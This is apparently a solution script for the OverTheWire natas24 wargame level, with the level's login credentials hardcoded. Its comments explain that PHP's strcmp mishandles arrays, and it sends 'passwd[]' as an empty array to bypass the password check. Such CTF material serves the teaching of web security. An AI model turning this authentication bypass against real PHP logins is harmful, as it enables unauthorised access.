import requests
import bs4
import re
import html


# configuration for natas24
USERNAME = 'natas24'
PASSWORD = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
URL = 'http://natas24.natas.labs.overthewire.org/'


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
source = html.unescape(response.text).replace('<br />', '')
source = bs4.BeautifulSoup(source, 'lxml')
# print(source.prettify())


"""
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
"""
# in the source code, we need to know the password to get the credentials for the 
# next level
# however, php's strcmp() function has a known vulnerability
# although the implementation is correct, (strcmp() will return 0 when the strings match)
# when comparing strings and non-string objects, it will return unexpected values
# reference: https://www.php.net/manual/en/function.strcmp.php
# for example, strcmp("foo", array()) => NULL + PHP Warning


# in PHP, NULL == 0, therefore, we can simply send an empty array to the website
# and it should give the credentials to the next level
# to do this, we can simply change the input type from text, i.e. "passwd", to 
# "passwd[]"
params = {
    "passwd[]" : "",
    "submit" : "Login"
}
response = session.get(URL, params=params)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')